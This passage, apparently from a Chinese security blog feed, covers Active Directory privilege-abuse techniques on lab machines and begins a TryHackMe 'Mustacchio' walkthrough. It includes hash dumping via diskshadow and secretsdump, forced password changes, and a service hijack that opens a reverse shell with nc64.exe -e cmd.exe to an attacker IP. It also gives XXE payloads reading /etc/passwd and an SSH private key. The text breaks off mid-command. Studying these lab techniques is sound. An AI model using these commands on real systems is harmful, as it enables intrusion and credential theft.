SeBackupPrivilege 的调用，方无需任何基于 ACL 的安全检查，我们可以借助该权限进行NTDS.dt卷影拷贝最终实现权限提升。</p><p><strong>实际应用场景：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">攻击的步骤大概分三步</span><br><span class="line">- 获取文件副本，`NTDS.dit`即存储 Active Directory 用户凭据的数据库。</span><br><span class="line">- 接下来，我们将获取 SYSTEM hive 文件，其中包含解密 NTDS.dit 所必需的系统启动密钥</span><br><span class="line">- 使用 Impacket 的 secretsdump 脚本从 NTDS.dit 中提取域中所有用户的 NTLM 哈希</span><br></pre></td></tr></table></figure><p>假如我们现在拿到了一个svc_backup用户的hash，然后我们开始使用evil-winrm尝试进行远程登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d</span><br></pre></td></tr></table></figure><p>通过我们之前导入的bloodhound的分析结果，我们得知该用户属于backup_operators组的成员</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474582386-8f350409-cffc-49f0-a6c6-459226ce5b50.png" alt="img"></p><p>因此该用户也很有可能是启用SEBackupPrivilege 权限的用户。我们执行如下命令，看一下其是否有该权限</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474710566-e486b9ce-7659-4bb5-9a5f-7df982f8b3a7.png" alt="img"></p><p>此时我们知道了我们拥有SEBackupPrivilege 权限，所以我们可以通过使用签名的二进制文件创建 NTDS.dit 的卷影副本来完成diskshadow 首先，创建一个名为 cmd.txt 的文本文件，其中包含以下内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set context persistent nowriters#</span><br><span class="line">add volume c: alias new1#</span><br><span class="line">set metadata c:\windows\system32\spool\drivers\color\example.cab # 添加的部分</span><br><span class="line">create#</span><br><span class="line">expose %new1% z:#</span><br></pre></td></tr></table></figure><p><a href="https://docs.datacore.com/WIK-WebHelp/VSS/DiskShadow_Commands_Example.htm">参考链接</a></p><p>然后执行diskshadow 并使用脚本文件作为其输入，接着我们可以使用这个<a href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug">SeBackupPrivilege</a>提供的两个<code>dll</code>文件，并按照其提供的步骤操作，来复制创建的 NTDS.dit 卷影副本<a href="https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug">SeBackupPrivilege</a>提供的两个<code>dll</code>文件，并按照其提供的步骤操作，来复制创建的 NTDS.dit 卷影副本</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474999442-6b1f0738-c080-4c36-a78a-7c74126646f5.png" alt="img"></p><p>将备份<code>ntds.dit</code>文件移动到当前文件夹</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475051343-dfa3b6e4-ed37-49b2-8a89-7d8b8a56c93f.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475071949-2357f008-5615-4c3e-9359-1fdf1131d018.png" alt="img"></p><p>从注册表中获取<code>system.hive</code>文件</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475094698-b226e8d3-c6f3-42b8-b977-2b493b7108fb.png" alt="img"></p><p>使用使用<code>secretsdump.py</code> 解析 <code>NTDS.dit</code></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475182029-fb8f0bee-8505-40ec-a0b9-03975d9f8a92.png" alt="img"></p><h1 id="滥用ForceChangePassword权限实现横向移动"><a href="#滥用ForceChangePassword权限实现横向移动" class="headerlink" title="滥用ForceChangePassword权限实现横向移动"></a>滥用ForceChangePassword权限实现横向移动</h1><p>简介： ForceChangePassword:强制更改密码,在不知道当前密码的情况下更改目标用户的密码。</p><p><strong>实际应用场景：</strong></p><p>我们在bloodhound可以看到support用户对AUDIT用户具有ForceChangePassword权限，顾名思义，就是<code>support</code>用户可以修改<code>audit2020</code>用户的密码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474359846-8e391f96-fd25-4058-85c8-a9d9cb4c62bf.png" alt="img"></p><p>尝试利用<code>rpcclient</code>修改<code>audit2020</code>用户的密码</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">rpcclient</span> -<span class="type">U</span> sup<span class="keyword">port</span> <span class="comment">--password=&#x27;#00^BlackKnight&#x27; //10.10.10.192</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474410545-68568a43-0b82-47a6-b1a6-b1622f313551.png" alt="img"></p><p>修改密码</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setuseri<span class="symbol">nfo2</span> audit<span class="number">2020</span> <span class="number">23</span> <span class="string">&#x27;test&#x27;</span></span><br></pre></td></tr></table></figure><p>其中<code>23</code>表示用户信息级别为设置用户密码的级别</p><p>当设置的新密码与密码策略不匹配时会返回，设置一个复杂度比较高的密码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474410762-e611b9c2-f7f9-47cd-97bf-79a2e6529afe.png" alt="img"></p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setuseri<span class="symbol">nfo2</span> audit<span class="number">2020</span> <span class="number">23</span> <span class="string">&#x27;abc123!&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474410695-e764bb99-4163-4b61-8096-2adfac47c699.png" alt="img"></p><p>利用<code>crackmapexec</code>验证一下</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">crackmapexec</span> smb <span class="number">10.10.10.192</span> -u audit2020 -p <span class="string">&#x27;abc123!&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474410789-3eeb3d55-f904-497e-920e-ea8f6f2c9a56.png" alt="img"></p><p>尝试通过<code>audit2020</code>用户去获得更多<code>smb</code>共享目录</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">smbmap</span> -H <span class="number">10.10.10.192</span> -u audit2020 -p <span class="string">&#x27;abc123!&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724474459320-bffb8374-1d2d-4a93-829a-585dbbd01e8a.png" alt="img"><br> 相比于之前的那个用户，我们获得了目录forensic的访问权限，可以进行进一步的信息搜集，或者利用该用户的权限来进行一些原本无法实现的操作。</p><h1 id="滥用DNS-Admin组权限实现权限提升"><a href="#滥用DNS-Admin组权限实现权限提升" class="headerlink" title="滥用DNS Admin组权限实现权限提升"></a>滥用DNS Admin组权限实现权限提升</h1><p>简介：当我们有权访问恰好是 DNSAdmins 组成员的用户帐户时，或者当受感染的用户帐户对 DNS 服务器对象具有写入权限时，我们可以滥用他的成员资格从而升级为管理员权限。简单来讲，DNSAdmins 组的成员可以访问网络 DNS 信息。默认权限如下： 允许：读取、写入、创建所有子对象、删除子对象、特殊权限。默认情况下，DNSAdmins 没有启动或停止 DNS 服务的能力，但管理员授予该组成员该权限并不罕见，当dnsadmins 组的成员被授予该权限时可用于通过 dll 注入将权限提升到管理员。</p><p><a href="https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2">参考链接</a></p><p><strong>实际应用场景：</strong></p><p>我们发现ryan用户是DNSAdmins 组的成员</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475243149-3c4322d0-7ee2-4757-a692-32e1ce657827.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475252762-af3b7dd7-a0a3-439c-a11e-db618de2dda6.png" alt="img"></p><p>发现<code>ryan</code>用户属于<code>contractors</code>组，而<code>contractors</code>组又属于<code>dnsadmins</code>组，所以<code>ryan</code>用户属于<code>dnsadmins</code>组</p><p>就可以利用 <code>DnsAdmins</code>权限进行<code>AD</code>域提权</p><p>在目标上，我们可以更改 dns 的配置，因为用户 ryan 属于dnsadmins组。我们还可以启动和停止 dns 服务。</p><p>首先我们可以使用 msfvenom 生成我们的有效负载 dll，然后启动smb服务</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475429673-387fa037-6643-4f57-a4b7-9ec4a03c6f46.png" alt="img"></p><p>因为正常<code>upload</code>传文件会被杀掉，这里考虑使用<code>smb</code>传文件</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475452509-72be61e3-8633-403d-b13c-4af30b38242b.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475472509-3bb24eb0-058d-4dd0-a356-b481a1837b7a.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475500613-a48af79f-d61b-4f3f-a486-0fed00f873cd.png" alt="img"></p><p>此时，之前利用<code>python</code>起的<code>smbserver</code>服务会收到回显</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475513971-bf7ec014-3dde-4ea8-b0d9-e76bc3e3ecd7.png" alt="img"></p><h1 id="滥用AD-Recycle-Bin权限实现权限提升"><a href="#滥用AD-Recycle-Bin权限实现权限提升" class="headerlink" title="滥用AD Recycle Bin权限实现权限提升"></a>滥用AD Recycle Bin权限实现权限提升</h1><p><strong>简介：</strong><code>AD Recycle Bin</code>是一个著名的 Windows 组。<a href="https://blog.stealthbits.com/active-directory-object-recovery-recycle-bin/">Active Directory 对象恢复（或回收站）</a>是 Server 2008 中添加的一项功能，允许管理员恢复已删除的项目，就像回收站对文件所做的一样。在 Windows Server 2012 之前，从 AD 回收站还原对象需要使用 LDAP 工具或 PowerShell 列出所有已删除的对象，筛选一长串对象以找到所需的对象，然后使用另一个 PowerShell 命令来还原它。</p><p><a href="https://blog.netwrix.com/2021/11/30/active-directory-object-recovery-recycle-bin/">参考链接</a></p><p><strong>实际应用场景：</strong></p><p>当前我们拿到了arksvc用户的shell，我们之前还找到了一个旧电子邮件，在该邮件中提到临时管理员帐户TempAdmin使用了与正常管理员帐户相同的密码（密码复用）。</p><p>通过使用以下命令我们可以查看当前用户的所属组</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475837278-8d50a4a2-e1df-4627-ac9d-f48bf6575c13.png" alt="img"></p><p>发现该用户属于 <code>AD Recycle Bin</code> 组下</p><p>我们可以使用以下命令来列出所有已删除的对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADObject -filter &#x27;isDeleted -eq $true -and name -ne &quot;Deleted Objects&quot;&#x27; -includeDeletedObjects</span><br></pre></td></tr></table></figure><p>最后一条比较有意思，我们发现了前面提到的临时用户<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475859325-8779824d-b8cc-4b0d-a80b-e5b2856edb2f.png" alt="img"></p><p>我们可以使用以下命令来获得该帐户的所有详细信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADObject -filter &#123; SAMAccountName -eq &quot;TempAdmin&quot; &#125; -includeDeletedObjects -property *</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475880391-e2411730-f329-425e-97d8-20698e5532fc.png" alt="img"></p><p>在该用户的详细信息中，我们发现了该用户的密码，尝试解密后成功得到了TempAdmin用户的密码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724475890680-ac1aece6-3118-4631-b56d-4e3d66390fd2.png" alt="img"></p><h1 id="滥用GenericWrite权限实现横向移动"><a href="#滥用GenericWrite权限实现横向移动" class="headerlink" title="滥用GenericWrite权限实现横向移动"></a>滥用GenericWrite权限实现横向移动</h1><p>简介：GenericWrite权限也就是通用写访问权限，该权限授予你写入目标对象上任何不受保护的属性的能力，包括组的“成员”和用户的“服务主体名称”。</p><p><strong>实际应用场景：</strong></p><p>当前我们拿到了用户sbauer的shell，这里我们尝试使用Blooodhound进行信息搜集</p><p>我们将bloodhound生成的json文件导入bloodhound分析，发现当前用户对JORDEN用户具有通用写权限，而JORDEN用户属于SERVER_OPERATORS组（高权限组）</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476044125-d4e5a90e-0eef-4ba9-8b65-0b649b2ba734.png" alt="img"></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476048485-acb32246-5fac-4f8a-a765-f008c9ac1260.png" alt="img"></p><p>这里我们说一下 AS-REP roasting攻击，该攻击允许为选择了“不需要 Kerberos 预身份验证”属性的用户检索密码哈希的技术。如果用户没有启用 Kerberos 预身份验证，我们可以为该用户请求 AS-REP，并且可以离线破解从而尝试恢复其明文密码。而这里SBAUER用户对JORDEN用户具有通用写权限，那么我们可以为JORDEN用户设置“不需要 Kerberos 预身份验证”的属性，从而尝试使用AS-REP roasting攻击获取其明文密码。</p><p>我们可以使用下面这条命令来为JORDEN用户设置“不需要 Kerberos 预身份验证”的属性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADUser jorden | Set-ADAccountControl -doesnotrequirepreauth $true</span><br></pre></td></tr></table></figure><p>然后我们可以使用impactet下的GetNPUsers脚本来获取jorden用户的AS-rep票据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py megacorp.local/jorden -dc-ip 10.10.10.179</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476143216-698c4f6a-f388-42dd-a82a-2ee98e260bef.png" alt="img"></p><p>我们把获取到的票据放到hash文件中，然后使用john尝试破解获取其明文密码</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476176979-31d3745a-67a1-4f4a-ad78-6dd2636610aa.png" alt="img"></p><h1 id="滥用Server-Operators组权限实现权限提升"><a href="#滥用Server-Operators组权限实现权限提升" class="headerlink" title="滥用Server Operators组权限实现权限提升"></a>滥用Server Operators组权限实现权限提升</h1><p>简介：Server Operators组：该组仅存在于域控制器上的内置组。默认情况下，该组没有成员。服务器操作员可以交互式登录到服务器；创建和删除网络共享；启动和停止服务；备份和恢复文件；格式化电脑硬盘；并关闭计算机。</p><p><strong>实际应用场景：</strong></p><p>当前我们拿到了用户jorden的shell，默认情况下，该组具备启动和停止服务的能力，并且该用户可以编辑任何服务。</p><p>所以这里使用服务路径劫持的方式来获得系统权限，首先上传<code>nc64.exe</code></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476259349-579d5f77-1f83-4c0f-a10f-0b79ba25a3f7.png" alt="img"></p><p>经过多次测试后发现可以改变<code>browser</code>服务的路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc.exe config browser binPath= &quot;C:\Users\jorden\Documents\nc64.exe -e cmd.exe 10.10.14.3 80</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476289851-b941cc82-2cac-4397-aa64-28836741e29c.png" alt="img"></p><p>kali中监听</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476314438-071e3dff-f44c-4642-af3f-468f24b3703c.png" alt="img"></p><p>然后在靶机中手动重启<code>browser</code>服务</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">sc.exe </span>stop <span class="keyword">browser</span></span><br><span class="line"><span class="keyword"></span><span class="keyword">sc.exe </span>start <span class="keyword">browser</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476328205-93ec8e94-e4e1-4ebd-816a-7906abdb834f.png" alt="img"></p><p>kali回显</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476340802-ebdc5e40-2d33-4ba0-9c94-a4bc88d719c6.png" alt="img"></p><h1 id="滥用SeBackup和SeRestore权限实现敏感文件的拷贝和读取"><a href="#滥用SeBackup和SeRestore权限实现敏感文件的拷贝和读取" class="headerlink" title="滥用SeBackup和SeRestore权限实现敏感文件的拷贝和读取"></a>滥用SeBackup和SeRestore权限实现敏感文件的拷贝和读取</h1><p>简介：SeBackupPrivilege权限：可以用来实现备份操作，对当前系统任意文件具有读权限 。 SeRestorePrivilege权限：该权限被描述为“需要执行恢复操作”，并导致系统将所有写访问控制权授予任何系统上的文件，而不考虑文件 ACL。 此外，该特权允许持有进程或线程更改所有者文件,因此获得此特权的含义应该是显而易见的。</p><p><strong>实际应用场景：</strong></p><p>通过使用<code>whoami /priv</code>命令发现该用户具有SeBackupPrivilege<code>和</code>SeRestorePrivilege权限</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476369509-5732c90f-3163-4206-a718-5a14af619fb9.png" alt="img"></p><p>有了SeBackupPrivilege和SeRestorePrivilege这两个权限，我就可以用<code>robocopy</code>来复制敏感文件并读取其内容，在实战环境下我们可以尝试读取其他的一些敏感文件。</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/40496941/1724476393196-787cc0bc-4227-40fa-a7a8-6042007fc928.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 域渗透应用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
            <tag> 横向移动 </tag>
            
            <tag> 权限滥用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THM-Mustacchio</title>
      <link href="/posts/1b81dcb8.html"/>
      <url>/posts/1b81dcb8.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.235.246</p></blockquote><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p><code>nmap -T4 -A -sV -sC -p- 10.10.235.246</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-15 15:02 CST</span><br><span class="line">Stats: 0:05:21 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan</span><br><span class="line">SYN Stealth Scan Timing: About 98.06% done; ETC: 15:07 (0:00:06 remaining)</span><br><span class="line">Stats: 0:05:45 elapsed; 0 hosts completed (1 up), 1 undergoing Traceroute</span><br><span class="line">Traceroute Timing: About 32.26% done; ETC: 15:08 (0:00:00 remaining)</span><br><span class="line">Nmap scan report for 10.10.235.246</span><br><span class="line">Host is up (0.30s latency).</span><br><span class="line">Not shown: 65532 filtered tcp ports (no-response)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)</span><br><span class="line">|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)</span><br><span class="line">|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">| http-robots.txt: 1 disallowed entry</span><br><span class="line">|_/</span><br><span class="line">|_http-title: Mustacchio | Home</span><br><span class="line">8765/tcp open  http    nginx 1.10.3 (Ubuntu)</span><br><span class="line">|_http-server-header: nginx/1.10.3 (Ubuntu)</span><br><span class="line">|_http-title: Mustacchio | Login</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose|specialized|storage-misc</span><br><span class="line">Running (JUST GUESSING): Linux 3.X|5.X (90%), Crestron 2-Series (86%), HP embedded (85%)</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5.4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3</span><br><span class="line">Aggressive OS guesses: Linux 3.10 - 3.13 (90%), Linux 5.4 (88%), Crestron XPanel control system (86%), HP P2000 G3 NAS device (85%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 22/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   275.52 ms 10.14.0.1</span><br><span class="line">2   355.01 ms 10.10.235.246</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 361.77 seconds</span><br></pre></td></tr></table></figure><p>可以看出开放了22，80，8765端口</p><h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015151010430-1583807408.png" alt="image-20241015150958963"></p><p>扫描下目录</p><p><code>gobuster dir -u http://10.10.235.246/ -w /usr/share/wordlists/dirb/common.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015151712711-928501733.png" alt="image-20241015151701655"></p><p>发现有个<code>robots.txt</code>，访问一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015151751823-1230137278.png" alt="image-20241015151741043"></p><p>没啥东西，继续查看其他目录文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015152256352-1632797138.png" alt="image-20241015152243976"></p><p>在<code>/custom/js/</code>下找到<code>users.bak</code>文件，像是备份文件，下载到本地查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015152858740-1160933654.png" alt="image-20241015152847711"></p><p>看起来像是数据库中的数据，这里有admin的加密密码，尝试破解一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015153033461-1519619990.png" alt="image-20241015153022188"></p><p>利用<code>john</code>成功获取到admin用户的明文密码<code>bulldog19</code></p><h2 id="8765端口"><a href="#8765端口" class="headerlink" title="8765端口"></a>8765端口</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015151929654-275177714.png" alt="image-20241015151918464"></p><p>像是admin后台登陆页面</p><p>使用之前获取到的用户名密码尝试登录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015153202210-1089947038.png" alt="image-20241015153151381"></p><p>成功登录</p><p>像是添加内容的一个页面，查看下源码</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015153411288-847205401.png" alt="image-20241015153400373"></p><p>又得到两个重要提示，一个是另一个bak文件，一个提示我们可以使用ssh连接Barry用key，但是我们目前还没有Barry用户的key</p><p>先看下bak文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015153629081-249297029.png" alt="image-20241015153618211"></p><p>内容有点像之前添加内容的格式，尝试添加一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015153834233-1962745226.png" alt="image-20241015153823235"></p><p>发现格式正确，可以试下其他的内容，测试是否存在xxe漏洞</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///etc/passwd&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>Joe Hamd<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>Barry Clad<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">com</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">com</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015154132533-1313842141.png" alt="image-20241015154121078"></p><p>发现能够读取<code>/etc/passwd</code>文件，我们就可以尝试读取<code>Barry</code>用户的ssh私钥来登录该用户</p><h1 id="SSH获取user权限"><a href="#SSH获取user权限" class="headerlink" title="SSH获取user权限"></a>SSH获取user权限</h1><p>首先确定好私钥的绝对路径</p><p><code>/home/barry/.ssh/id_rsa</code></p><p>构造恶意内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///home/barry/.ssh/id_rsa&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>Joe Hamd<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>Barry Clad<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">com</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">com</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015154516232-8958968.png" alt="image-20241015154505258"></p><p>成功读取到私钥，将其保存至<code>id_rsa</code>文件<strong>（注意格式）</strong>，并赋予<code>600</code>权限，爆破加密私钥的密码</p><p>利用ssh通过私钥登录的方式常熟登录Barry用户</p><p>先将<code>id_rsa</code>转换成hash格式</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015155431516-1174663865.png" alt="image-20241015155420384"></p><p>使用john爆破密码</p><p><code>john rsa_hash --wordlist=/usr/share/wordlists/rockyou.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015155556279-2034530019.png" alt="image-20241015155545683"></p><p>发现密码<code>urieljames</code>，使用私钥登录ssh</p><p><code>ssh barry@10.10.235.246 -i id_rsa</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015155820199-1962063428.png" alt="image-20241015155809630"></p><p>登陆成功</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015155843741-2084925548.png" alt="image-20241015155833241"></p><p>在当前目录下找到<code>user.txt</code></p><h1 id="提升至root权限"><a href="#提升至root权限" class="headerlink" title="提升至root权限"></a>提升至root权限</h1><h2 id="寻找提权目标"><a href="#寻找提权目标" class="headerlink" title="寻找提权目标"></a>寻找提权目标</h2><p>使用<code>sudo -l</code>试试</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241015160125542-1414416860.png" alt="image-20241015160114807"></p><p>发现用不了，再试试find命令</p><p><code>find / -type f -perm -u=s 